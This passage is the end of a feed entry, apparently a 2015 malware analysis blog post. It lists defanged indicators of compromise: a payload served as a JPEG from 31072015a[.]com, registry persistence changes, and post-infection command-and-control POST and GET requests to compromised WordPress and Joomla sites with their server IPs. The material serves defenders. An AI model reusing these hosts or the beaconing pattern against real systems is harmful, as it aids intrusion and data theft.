+* Connected to 31072015a[.]com (195.225.228.156) port 80 (#0)
+GET /images/five1.jpg HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Host: 31072015a[.]com
+Accept: */*
+
+HTTP/1.1 200 OK
+Server: Apache/2.2.15 (CentOS)
+Last-Modified: Wed, 05 Aug 2015 21:35:01 GMT
+ETag: "c10000c-40e00-51c972cdc4b23"
+Accept-Ranges: bytes
+Content-Length: 265728
+Connection: close
+
+# Registry Activity
+Modifies registry to disable system restore
+Creates a file in the windows start menu folder
+Modifies autorun registry key values
+
+# Network Traffic
+GET hxxp://ip-addr[.]es:80/
+Server IP: 188.165.164.184
+
+POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?w=cg1odjtnay
+POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?n=t1dfbt93fg
+POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?h=qovvtc388iq4bm
+POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?t=4l425ka9qjn
+Server IP: 112.78.2.209
+
+POST hxxp://aeusasoftball[.]com:80/wp-content/themes/sports-team-theme/includes/adva...cg1odjtnay
+Server IP: 184.168.47.225
+
+GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?b=cg1odjtnay
+GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?f=t1dfbt93fg
+GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?p=qovvtc388iq4bm
+GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?y=4l425ka9qjn
+POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?b=cg1odjtnay
+POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?f=t1dfbt93fg
+POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?p=qovvtc388iq4bm
+POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?y=4l425ka9qjn
+Server IP: 94.102.1.207
+
+POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?x=cg1odjtnay
+POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?u=t1dfbt93fg
+POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?p=4l425ka9qjn
+Server IP: 95.85.4.87
+</code></pre>
+
+<hr />
+
+<h4>five2.jpg/211954869.exe Analysis</h4>
+
+<pre><code># Payload Download: Response
+* Connected to 31072015a[.]com (107.15.99.91) port 80 (#0)
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Host: 31072015a[.]com
+Accept: */*
+HTTP/1.1 200 OK
+
+Server: Apache/2.2.15 (CentOS)
+Last-Modified: Wed, 05 Aug 2015 21:30:02 GMT
+ETag: "c100037-3a600-51c971b00f877"
+Accept-Ranges: bytes
+Content-Length: 239104
+Connection: close
+Content-Type: image/jpeg
+
+# Network Traffic
+Post-Infection Requests:
+POST hxxp://prestigecarstorage.com[.]au:80/wp-includes/Text/Text.php
+Server IP: 192.186.240.131
+
+POST hxxp://mcmamina[.]cz:80/media/plg_quickicon_joomlaupdate/plg_quickicon_joomlaupdate.php
+Server IP: 82.208.47.134
+
+POST hxxp://buyseoplan[.]com:80/wp-admin/includes/includes.php
+Server IP: 160.153.34.130
+
+POST hxxp://letssaidiana[.]com:80/wp-admin/user/user.php
+Server IP: 50.62.121.1
+
+POST hxxp://kenyadivas[.]com:80/media/editors/editors.php
+Server IP: 192.254.185.141
+
+POST hxxp://keithgerchak[.]com:80/wp-admin/css/css.php
+Server IP: 50.63.93.1
+
+POST hxxp://binarycashbackdaily[.]com:80/wp-admin/maint/maint.php
+Server IP: 198.15.118.164
+
+POST hxxp://apexsitesolutions[.]com:80/main/wp-admin/mod_html.php
+Server IP: 184.168.179.1
+
+POST hxxp://employerservice[.]net:80/wp-includes/theme-compat/theme-compat.php
+Server IP: 23.229.242.167
+
+POST hxxp://hmb.com[.]au:80/wp-admin/images/images.php
+Server IP: 192.186.203.132
+
+POST hxxp://denver-computer-repairs[.]com:80/wordpress2/wp-includes/fckeditor.php
+Server IP: 173.201.146.180
+
+POST hxxp://hatmandoo.co[.]uk:80/cache/mod_menu/mod_menu.php
+Server IP: 192.254.235.245
+
+POST hxxp://wizjafotografii[.]pl:80/wp-content/languages/languages.php
+Server IP: 46.16.186.66
+</code></pre>
+]]></content>
+  </entry>
+  
+</feed>
